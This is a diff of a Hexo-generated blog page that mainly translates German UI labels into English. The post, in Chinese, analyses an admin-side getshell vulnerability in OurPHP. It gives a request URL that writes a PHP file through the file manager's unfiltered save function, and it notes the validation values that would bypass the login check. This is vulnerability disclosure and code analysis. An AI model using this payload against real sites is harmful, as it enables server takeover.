@@ -15,11 +15,11 @@
 
 
 <html class="theme-next mist use-motion" lang="zh-Hans">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
-<meta name="theme-color" content="#222"/>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
 
 
 
@@ -44,9 +44,9 @@
 
 
 
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2"/>
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
 
-<link rel="stylesheet" href="/css/main.css?v=7.1.0"/>
+<link rel="stylesheet" href="/css/main.css?v=7.1.0">
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="https://github.com/Windylh/image/raw/master/icon.ico?v=7.1.0">
@@ -96,25 +96,18 @@
 
 
 
-  <meta name="description" content="0x00 Payload1/client/manage/ourphp_filebox.php?op=save&amp;amp;encode=UTF-8&amp;amp;fename=1.php&amp;amp;ncontent=&amp;lt;?php phpinfo(); ?&amp;gt;
-在登陆后台后，可直接上传文件。
-代码分析/ourphp/client/manage/ourphp_filebox.php 694行
-123456">
+  <meta name="description" content="0x00 Payload1/client/manage/ourphp_filebox.php?op=save&amp;amp;encode=UTF-8&amp;amp;fename=1.php&amp;amp;ncontent=&amp;lt;?php phpinfo(); ?&amp;gt; 在登陆后台后，可直接上传文件。 代码分析/ourphp/client/manage/ourphp_filebox.php 694行 123456">
+<meta name="keywords" content="Web,代码审计">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Ourphp后台getshell漏洞">
 <meta property="og:url" content="http://yoursite.com/2017/09/18/Ourphp后台getshell漏洞/index.html">
-<meta property="og:site_name" content="Windylh's blog">
-<meta property="og:description" content="0x00 Payload1/client/manage/ourphp_filebox.php?op=save&amp;amp;encode=UTF-8&amp;amp;fename=1.php&amp;amp;ncontent=&amp;lt;?php phpinfo(); ?&amp;gt;
-在登陆后台后，可直接上传文件。
-代码分析/ourphp/client/manage/ourphp_filebox.php 694行
-123456">
+<meta property="og:site_name" content="Windylh&#39;s blog">
+<meta property="og:description" content="0x00 Payload1/client/manage/ourphp_filebox.php?op=save&amp;amp;encode=UTF-8&amp;amp;fename=1.php&amp;amp;ncontent=&amp;lt;?php phpinfo(); ?&amp;gt; 在登陆后台后，可直接上传文件。 代码分析/ourphp/client/manage/ourphp_filebox.php 694行 123456">
+<meta property="og:locale" content="zh-Hans">
 <meta property="og:updated_time" content="2018-11-01T10:53:28.984Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Ourphp后台getshell漏洞">
-<meta name="twitter:description" content="0x00 Payload1/client/manage/ourphp_filebox.php?op=save&amp;amp;encode=UTF-8&amp;amp;fename=1.php&amp;amp;ncontent=&amp;lt;?php phpinfo(); ?&amp;gt;
-在登陆后台后，可直接上传文件。
-代码分析/ourphp/client/manage/ourphp_filebox.php 694行
-123456">
+<meta name="twitter:description" content="0x00 Payload1/client/manage/ourphp_filebox.php?op=save&amp;amp;encode=UTF-8&amp;amp;fename=1.php&amp;amp;ncontent=&amp;lt;?php phpinfo(); ?&amp;gt; 在登陆后台后，可直接上传文件。 代码分析/ourphp/client/manage/ourphp_filebox.php 694行 123456">
 
 
 
@@ -122,7 +115,7 @@
 
   
   
-  <link rel="canonical" href="http://yoursite.com/2017/09/18/Ourphp后台getshell漏洞/"/>
+  <link rel="canonical" href="http://yoursite.com/2017/09/18/Ourphp后台getshell漏洞/">
 
 
 
@@ -200,7 +193,7 @@
   </div>
 
   <div class="site-nav-toggle">
-    <button aria-label="Navigationsleiste an/ausschalten">
+    <button aria-label="Toggle navigation bar">
       <span class="btn-bar"></span>
       <span class="btn-bar"></span>
       <span class="btn-bar"></span>
@@ -228,7 +221,7 @@
 
     
 
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br/>Startseite</a>
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
 
   </li>
         
@@ -245,7 +238,7 @@
 
     
 
-    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br/>Schlagwörter</a>
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
 
   </li>
         
@@ -262,7 +255,7 @@
 
     
 
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br/>Archiv</a>
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
 
   </li>
 
@@ -314,16 +307,16 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/18/Ourphp后台getshell漏洞/"/>
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/18/Ourphp后台getshell漏洞/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Windylh"/>
-      <meta itemprop="description" content=""/>
-      <meta itemprop="image" content="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg"/>
+      <meta itemprop="name" content="Windylh">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Windylh's blog"/>
+      <meta itemprop="name" content="Windylh's blog">
     </span>
 
     
@@ -350,14 +343,14 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posted on</span>
               
 
               
                 
               
 
-              <time title="Erstellt: 2017-09-18 00:00:00" itemprop="dateCreated datePublished" datetime="2017-09-18T00:00:00+08:00">2017-09-18</time>
+              <time title="Created: 2017-09-18 00:00:00" itemprop="dateCreated datePublished" datetime="2017-09-18T00:00:00+08:00">2017-09-18</time>
             
 
             
@@ -372,9 +365,9 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 
-                  <span class="post-meta-item-text">Bearbeitet am</span>
+                  <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Geändert am: 2018-11-01 18:53:28" itemprop="dateModified" datetime="2018-11-01T18:53:28+08:00">2018-11-01</time>
+                <time title="Modified: 2018-11-01 18:53:28" itemprop="dateModified" datetime="2018-11-01T18:53:28+08:00">2018-11-01</time>
               
             
           </span>
@@ -394,7 +387,7 @@
                 <i class="fa fa-eye"></i>
               </span>
               
-                <span class="post-meta-item-text">Aufrufe: </span>
+                <span class="post-meta-item-text">Views: </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
@@ -419,14 +412,14 @@
       
 
       
-        <h2 id="0x00-Payload"><a href="#0x00-Payload" class="headerlink" title="0x00 Payload"></a>0x00 Payload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/client/manage/ourphp_filebox.php?op=save&amp;encode=UTF-8&amp;fename=1.php&amp;ncontent=&lt;?php phpinfo(); ?&gt;</div></pre></td></tr></table></figure>
+        <h2 id="0x00-Payload"><a href="#0x00-Payload" class="headerlink" title="0x00 Payload"></a>0x00 Payload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/client/manage/ourphp_filebox.php?op=save&amp;encode=UTF-8&amp;fename=1.php&amp;ncontent=&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
 <p>在登陆后台后，可直接上传文件。</p>
 <h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>/ourphp/client/manage/ourphp_filebox.php 694行</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($ncontent, $fename, $encode)</span> </span>&#123;</div><div class="line">    <span class="keyword">global</span> $meurl,$folder;</div><div class="line">    <span class="keyword">if</span> (!$fename == <span class="string">""</span>) &#123;</div><div class="line">    maintop(<span class="string">"编辑"</span>);</div><div class="line">    $file = iconv(<span class="string">"UTF-8"</span>, <span class="string">"GBK"</span>, $folder.$fename);</div><div class="line">    $ydata = stripslashes($ncontent);</div><div class="line">    <span class="keyword">if</span>($encode!==<span class="string">"UTF-8"</span> &amp;&amp; $encode!==<span class="string">"ASCII"</span>)&#123;</div><div class="line">        $ydata = iconv($encode, <span class="string">"UTF-8"</span>, $ydata);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(file_put_contents($file, $ydata)) &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;div class='box'&gt;文件 &lt;a href=\""</span>.$folder.$fename.<span class="string">"\" target=\"_blank\"&gt;"</span>.$folder.$fename.<span class="string">"&lt;/a&gt; 保存成功！\n"</span></div><div class="line">            .<span class="string">"请选择 &lt;a href=\""</span>.$meurl.<span class="string">"?op=home&amp;folder="</span>.$_SESSION[<span class="string">'folder'</span>].<span class="string">"\"&gt;返回文件管理&lt;/a&gt; 或者 &lt;a href=\""</span>.$meurl.<span class="string">"?op=edit&amp;fename="</span>.$fename.<span class="string">"&amp;folder="</span>.$folder.<span class="string">"\"&gt;继续编辑&lt;/a&gt;&lt;/div&gt;\n"</span>;</div><div class="line">        $fp = <span class="keyword">null</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;span class='error'&gt;文件保存出错！&lt;/span&gt;\n"</span></div><div class="line">        .<span class="string">" &lt;a href=\""</span>.$meurl.<span class="string">"?op=home&amp;folder="</span>.$_SESSION[<span class="string">'folder'</span>].<span class="string">"\"&gt;返回文件管理&lt;/a&gt;\n"</span>;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">    home();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>函数调用位置:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">switch</span> ($op)&#123;</div><div class="line">    ……</div><div class="line">    <span class="keyword">case</span> <span class="string">"save"</span>:</div><div class="line">    save($_REQUEST[<span class="string">'ncontent'</span>], $_REQUEST[<span class="string">'fename'</span>], $_REQUEST[<span class="string">'encode'</span>]);</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure></p>
-<p>op参数位置：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'op'</span>]))&#123;</div><div class="line">    $op = $_REQUEST[<span class="string">'op'</span>];</div><div class="line">    session_start();</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">    $op = <span class="string">'home'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($ncontent, $fename, $encode)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $meurl,$folder;</span><br><span class="line">    <span class="keyword">if</span> (!$fename == <span class="string">""</span>) &#123;</span><br><span class="line">    maintop(<span class="string">"编辑"</span>);</span><br><span class="line">    $file = iconv(<span class="string">"UTF-8"</span>, <span class="string">"GBK"</span>, $folder.$fename);</span><br><span class="line">    $ydata = stripslashes($ncontent);</span><br><span class="line">    <span class="keyword">if</span>($encode!==<span class="string">"UTF-8"</span> &amp;&amp; $encode!==<span class="string">"ASCII"</span>)&#123;</span><br><span class="line">        $ydata = iconv($encode, <span class="string">"UTF-8"</span>, $ydata);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(file_put_contents($file, $ydata)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;div class='box'&gt;文件 &lt;a href=\""</span>.$folder.$fename.<span class="string">"\" target=\"_blank\"&gt;"</span>.$folder.$fename.<span class="string">"&lt;/a&gt; 保存成功！\n"</span></span><br><span class="line">            .<span class="string">"请选择 &lt;a href=\""</span>.$meurl.<span class="string">"?op=home&amp;folder="</span>.$_SESSION[<span class="string">'folder'</span>].<span class="string">"\"&gt;返回文件管理&lt;/a&gt; 或者 &lt;a href=\""</span>.$meurl.<span class="string">"?op=edit&amp;fename="</span>.$fename.<span class="string">"&amp;folder="</span>.$folder.<span class="string">"\"&gt;继续编辑&lt;/a&gt;&lt;/div&gt;\n"</span>;</span><br><span class="line">        $fp = <span class="keyword">null</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;span class='error'&gt;文件保存出错！&lt;/span&gt;\n"</span></span><br><span class="line">        .<span class="string">" &lt;a href=\""</span>.$meurl.<span class="string">"?op=home&amp;folder="</span>.$_SESSION[<span class="string">'folder'</span>].<span class="string">"\"&gt;返回文件管理&lt;/a&gt;\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    home();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>函数调用位置:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ($op)&#123;</span><br><span class="line">    ……</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"save"</span>:</span><br><span class="line">    save($_REQUEST[<span class="string">'ncontent'</span>], $_REQUEST[<span class="string">'fename'</span>], $_REQUEST[<span class="string">'encode'</span>]);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></p>
+<p>op参数位置：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'op'</span>]))&#123;</span><br><span class="line">    $op = $_REQUEST[<span class="string">'op'</span>];</span><br><span class="line">    session_start();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $op = <span class="string">'home'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>所有参数全部都是request到的，也没有经过过滤函数，就直接拼接到了字符串中，进行了文件读写，保存。</p>
-<p>CNVD-2017-13894是前台漏洞，但是我并没有找到如何绕过验证。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (@$_GET[<span class="string">'validation'</span>] == $ourphp[<span class="string">'validation'</span>] &amp;&amp; $_GET[<span class="string">'code'</span>] == $ourphp[<span class="string">'safecode'</span>])&#123;</div><div class="line">    $_SESSION[<span class="string">'ourphp_outtime'</span>] = time() + <span class="number">3600</span>; </div><div class="line">    $_SESSION[<span class="string">'ourphp_out'</span>] = <span class="string">"ourphp"</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'ourphp_out'</span>]))&#123;</div><div class="line">            $filefolder = str_replace(<span class="string">'\\'</span>,<span class="string">'/'</span>,WEB_ROOT.$ourphp[<span class="string">'webpath'</span>]);</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">include</span> <span class="string">'ourphp_checkadmin.php'</span>;</div><div class="line">            $filefolder = str_replace(<span class="string">'\\'</span>,<span class="string">'/'</span>,WEB_ROOT.$ourphp[<span class="string">'webpath'</span>].<span class="string">"templates/"</span>);</div><div class="line">        &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>CNVD-2017-13894是前台漏洞，但是我并没有找到如何绕过验证。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (@$_GET[<span class="string">'validation'</span>] == $ourphp[<span class="string">'validation'</span>] &amp;&amp; $_GET[<span class="string">'code'</span>] == $ourphp[<span class="string">'safecode'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'ourphp_outtime'</span>] = time() + <span class="number">3600</span>; </span><br><span class="line">    $_SESSION[<span class="string">'ourphp_out'</span>] = <span class="string">"ourphp"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'ourphp_out'</span>]))&#123;</span><br><span class="line">            $filefolder = str_replace(<span class="string">'\\'</span>,<span class="string">'/'</span>,WEB_ROOT.$ourphp[<span class="string">'webpath'</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">'ourphp_checkadmin.php'</span>;</span><br><span class="line">            $filefolder = str_replace(<span class="string">'\\'</span>,<span class="string">'/'</span>,WEB_ROOT.$ourphp[<span class="string">'webpath'</span>].<span class="string">"templates/"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>这里验证了validation和safecode，validation是ourphp的口令码，safecode是随机生成的32位的安全码，如果有这两个字符串也可以绕过验证。</p>
 
       
@@ -466,8 +459,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/09/18/PicoCTF-level1-WriteUp/" rel="next" title="PicoCTF Level1 WriteUp">
-                <i class="fa fa-chevron-left"></i> PicoCTF Level1 WriteUp
+              <a href="/2017/09/18/PicoCTF-level3-WriteUp/" rel="next" title="PicoCTF Level3 WriteUp">
+                <i class="fa fa-chevron-left"></i> PicoCTF Level3 WriteUp
               </a>
             
           </div>
@@ -476,8 +469,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/11/27/miac第二轮/" rel="prev" title="Miac2017第二轮Writeup">
-                Miac2017第二轮Writeup <i class="fa fa-chevron-right"></i>
+              <a href="/2017/09/18/PicoCTF-level1-WriteUp/" rel="prev" title="PicoCTF Level1 WriteUp">
+                PicoCTF Level1 WriteUp <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -524,10 +517,10 @@
       
         <ul class="sidebar-nav motion-element">
           <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Inhaltsverzeichnis
+            Table of Contents
           </li>
           <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Übersicht
+            Overview
           </li>
         </ul>
       
@@ -536,9 +529,7 @@
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
-              <img class="site-author-image" itemprop="image"
-                src="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg"
-                alt="Windylh"/>
+              <img class="site-author-image" itemprop="image" src="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg" alt="Windylh">
             
               <p class="site-author-name" itemprop="name">Windylh</p>
               <div class="site-description motion-element" itemprop="description"></div>
@@ -552,7 +543,7 @@
                   <a href="/archives/">
                 
                     <span class="site-state-item-count">32</span>
-                    <span class="site-state-item-name">Artikel</span>
+                    <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
               
@@ -597,7 +588,7 @@
                       
                     
                     <span class="site-state-item-count">13</span>
-                    <span class="site-state-item-name">schlagwörter</span>
+                    <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
               
@@ -742,7 +733,7 @@
 </div>
 
 
-  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.2.2</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
 
 
 
@@ -750,7 +741,7 @@
 
 
 
-  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> v7.1.0</div>
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> v7.1.0</div>
 
 
 
